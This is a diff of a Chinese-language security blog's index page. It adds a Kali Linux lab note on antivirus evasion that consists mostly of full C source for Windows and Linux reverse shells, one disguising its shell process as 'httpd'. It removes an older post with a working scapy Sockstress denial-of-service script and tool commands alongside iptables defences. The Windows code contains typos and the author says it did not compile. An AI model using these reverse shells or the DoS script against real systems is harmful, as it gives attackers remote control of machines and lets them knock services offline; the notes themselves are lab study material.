@@ -240,6 +240,197 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E8%87%AA%E7%BC%96%E5%86%99shell/" itemprop="url">Kali Linux笔记(九十一)：免杀技术--自编写shell</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-13T20:50:01+08:00">
+                2020-02-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  318 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <hr>
+<h4 id="1-自己编写后门"><a href="#1-自己编写后门" class="headerlink" title="1. 自己编写后门"></a>1. 自己编写后门</h4><ul>
+<li>▲ 2020.2.13window的shell都无法通过编译</li>
+<li>Windows reverse shell<ul>
+<li><strong><code>🔺命令：wine gcc.exe windows_revers_shell.c -o windows.exe -lws2_32</code></strong></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">#pragma comment(lib,&quot;ws2_32&quot;)</span><br><span class="line"></span><br><span class="line">  WSADATA wsaData;</span><br><span class="line">  SOCKET Winsock;</span><br><span class="line">  SOCKET Sock;</span><br><span class="line">  struct sockaddr_in hax;</span><br><span class="line">  char ip_addr[16];</span><br><span class="line">  STARTUPINFO ini_processo;</span><br><span class="line">  PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    WSAStartup(MAKEWORD(2,2),&amp;wsaData);</span><br><span class="line">    Winsock=WSASocket(AF_INET,SOCK_STREM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);</span><br><span class="line"></span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;Uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    struct hostent *host;</span><br><span class="line">    host = gethostbyname(argv[1]);</span><br><span class="line">    strcpy(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">    hax.sin_family = AF_INET;</span><br><span class="line">    hax.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">    WSAConnect(Winsock,(SOCKADDR*)&amp;hax,sizeof(hax),NULL,NULL,NULL,NULL);</span><br><span class="line"></span><br><span class="line">    memset(&amp;ini_processo,0,sizeof(ini_preocesso));</span><br><span class="line">    ini_processo.cb=sizeof(ini_processo);</span><br><span class="line">    ini_processo.dwFlags=STARTF_USESTDHANDLES;</span><br><span class="line">    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)winsock;</span><br><span class="line">    CreateProcess(NULL,&quot;cmd.exe&quot;,NULL,NULL,TRUE,0,NULL,NULL,&amp;ini_processo,&amp;processo_info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>Linux shell<ul>
+<li><strong><code>🔺命令：gcc -o linux.sh linux_revers_shell.c</code></strong></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;arpa/inet.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc,char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    struct sockaddr_in sock;</span><br><span class="line">    int s;</span><br><span class="line">    if(argc != 3)</span><br><span class="line">    &#123;</span><br><span class="line">        fprintf(stderr,&quot;uso:&lt;rhost&gt;&lt;rport&gt;\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line">    sock.sin_family = AF_INET;</span><br><span class="line">    sock.sin_port = htons(atoi(argv[2]));</span><br><span class="line">    sock.sin_addr.s_addr = inet_addr(argv[1]);</span><br><span class="line">    s=socket(AF_INET,SOCK_STREAM,0);</span><br><span class="line"></span><br><span class="line">    connect(s,(struct sockaddr_in *)&amp;sock,sizeof(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">    dup2(s,0);</span><br><span class="line">    dup2(s,1);</span><br><span class="line">    dup2(s,2);</span><br><span class="line">    execl(&quot;/bin/sh&quot;,&quot;httpd&quot;,(char *)0);  //process httpd</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://aliyun.tomassky.top:8088/kodex/index.php?user/publicLink&fid=7bf2JUs5DMtehccBmf4Z5fv69w6jB6oxhpGZ55yIZcluckaHCJO9CdrybGQ8CTjNaH4B64ZYnAGNiQQ3eaRwhNhXMUnob2rCVCQ9AbGqPTFhF1JSP5uMXgA&file_name=/linux.sh.PNG" alt="linux.sh"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/13/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81)%EF%BC%9A%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF--%E6%A8%A1%E6%9D%BF%E7%A8%8B%E5%BA%8F%E9%99%84%E7%9D%80/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2685,257 +2876,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Tomas">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/photo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tomas'Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2020/02/09/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%85%AB%E5%8D%81%E4%B8%80)%EF%BC%9ASockstress/" itemprop="url">Kali Linux笔记(八十一)：Sockstress</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-09T21:34:04+08:00">
-                2020-02-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Kali/" itemprop="url" rel="index">
-                    <span itemprop="name">Kali</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  857 字
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  3 分钟
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <hr>
-<h4 id="1-Sockstress"><a href="#1-Sockstress" class="headerlink" title="1. Sockstress"></a>1. Sockstress</h4><ul>
-<li>2008年由Jack C.Louis发现</li>
-<li>针对TCP服务的拒绝服务攻击<ul>
-<li>消耗被攻击目标系统资源，不消耗网络带宽自宽</li>
-<li>与攻击目标建立socket连接</li>
-<li>▲ 设计原理：完成三次握手，最后的ACK包window大小为0（客户端不接收数据）</li>
-<li>攻击者资源消耗小（CPU、内存、带宽）</li>
-<li>异步攻击，单机可拒绝服务高配资源服务器</li>
-<li>Window窗口实现TCP流控</li>
-</ul>
-</li>
-</ul>
-<h4 id="2-实验准备"><a href="#2-实验准备" class="headerlink" title="2. 实验准备"></a>2. 实验准备</h4><ul>
-<li>Kali（攻击者）<ul>
-<li>网卡方式为NAT/Bridge方式，NAT/桥接到无线网络，检查网络</li>
-</ul>
-</li>
-<li>Metasploit（被攻击者）<ul>
-<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
-</ul>
-</li>
-</ul>
-<h4 id="3-实验–Python脚本"><a href="#3-实验–Python脚本" class="headerlink" title="3. 实验–Python脚本"></a>3. 实验–Python脚本</h4><ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li>python脚本：<strong><code>🔺命令：./sockstress.py Metasploit的IP 21 200</code></strong></li>
-<li>▲ 2020.2.9此脚本攻击效果甚微弱</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#_*_ coding:utf-8 _*_</span><br><span class="line"></span><br><span class="line">from scapy.all import *</span><br><span class="line">from time import sleep</span><br><span class="line">import thread</span><br><span class="line">import logging</span><br><span class="line">import os</span><br><span class="line">import signal</span><br><span class="line">import sys</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 4:</span><br><span class="line">    print &quot;用法：./sockstress.py [目标IP] [端口] [线程数]&quot;</span><br><span class="line">    print &quot;举例：./sockstress.py 10.0.0.5 21 20 ## 请确定被攻击端口处于开放状态&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">target = str(sys.argv[1])</span><br><span class="line">dstport = int(sys.argv[2])</span><br><span class="line">threads = int(sys.argv[3])</span><br><span class="line"></span><br><span class="line">## 攻击函数</span><br><span class="line">def sockstress(target,dstport):</span><br><span class="line">    while 0 == 0:</span><br><span class="line">        try:</span><br><span class="line">            x = random.randint(0,65535)</span><br><span class="line">            response = sr1(IP(dst=target)/TCP(sport=x,dport=dstport,flags=&quot;S&quot;),timeout=1,verbose=0)</span><br><span class="line">            send(IP(dst=target)/TCP(sport=x,dport=dstport,window=0,flags=&quot;A&quot;,ack=(response[TCP].seq+1))/&apos;\x00\x00&apos;,verbose=0)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">## 停止攻击函数</span><br><span class="line">def shutdown(signal,frame):</span><br><span class="line">    print &quot;正在恢复iptables 规则&quot;</span><br><span class="line">    os.system(&apos;iptables -D OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">## 添加iptables规则</span><br><span class="line">os.system(&apos;iptables -A OUTPUT -p tcp --tcp-flags RST RST -d&apos;+target+&apos; -j DROP&apos;)</span><br><span class="line">signal.signal(signal.SIGINT,shutdown)</span><br><span class="line"></span><br><span class="line">## 多线程攻击</span><br><span class="line">print &quot;\n攻击正在进行...按 Ctrl+C 停止攻击&quot;</span><br><span class="line">for x in range(0,threads):</span><br><span class="line">    thread.start_new_thread(sockstress,(target,dstport))</span><br><span class="line"></span><br><span class="line">## 永远执行</span><br><span class="line">while 0==0:</span><br><span class="line">    sleep(1)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
-<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
-<li><strong><code>🔺命令：Free -m</code></strong>（查看系统所用资源）</li>
-</ul>
-</li>
-</ul>
-<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ecf9kHo1arl_kZP61rNqhSJunjTth3MCHAa59FVQyZfJl_RpsW_Ym-SlfpGWCtf8I1vQfSxITqNiaWpLQLK_Eiaia2B9ayVj4sb7CILix1uDs6rSN87fVmVuNJCrlyeMWRMykM0zJqVR_XWZ4w&file_name=/sockstress%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%B5%84%E6%BA%90%E5%9B%BE.PNG" alt="服务器资源图"></p>
-<h4 id="4-实验–C脚本"><a href="#4-实验–C脚本" class="headerlink" title="4. 实验–C脚本"></a>4. 实验–C脚本</h4><ul>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
-</ul>
-</li>
-<li>Kali（攻击者）<ul>
-<li>防火墙规则：<strong><code>🔺命令：iptables -A OUTPUT -p TCP --tcp-flags rst rst -d Metasploit的IP -j DROP</code></strong></li>
-<li>下载地址：<a href="https://github.com/defuse/sockstress" target="_blank" rel="noopener">https://github.com/defuse/sockstress</a> </li>
-<li><strong><code>🔺命令：gcc -Wall -c sockstress.c</code></strong> </li>
-<li><strong><code>🔺命令：gcc -pthread -o sockstress sockstress.o</code></strong> </li>
-<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0</code></strong> </li>
-<li><strong><code>🔺命令：./sockstress Metasploit的IP:80 eth0 -p payloads/http -d 10</code></strong></li>
-</ul>
-</li>
-<li>Metasploit（被攻击者）<ul>
-<li><strong><code>🔺命令：top</code></strong>查看系统性能，重点关注CPU、内存、SWAP是否提高或者不变</li>
-<li><strong><code>🔺命令：netstat -pantu | grep ESTAB | wc -l</code></strong>（查看已经建立的连接数）</li>
-<li><strong><code>🔺命令：free -m</code></strong>（查看系统所用资源）</li>
-</ul>
-</li>
-</ul>
-<h4 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h4><ul>
-<li>直到今天sockstress攻击仍然是一种很有效的DoS攻击方式</li>
-<li>由于建立完整的TCP三步握手，因此使用syn cookie防御无效（syn cookie对半步连接有效）</li>
-<li>根本的防御方法是采用白名单（不实际）</li>
-<li>折中对策：限制单位时间内每IP建的TCP连接数<ul>
-<li>封杀每30秒与80端口建立连接10个的IP地址</li>
-<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</code></strong></li>
-<li><strong><code>🔺命令：iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</code></strong></li>
-<li>以上规则对DDoS攻击无效</li>
-</ul>
-</li>
-<li>▲ 可在Metasploit中加入iptables规则，Kali进行DoS尝试</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2990,7 +2930,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">117</span>
+                  <span class="site-state-item-count">118</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -3097,7 +3037,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">103.9k</span>
+    <span title="Site words total count">104.1k</span>
   
 </div>
 
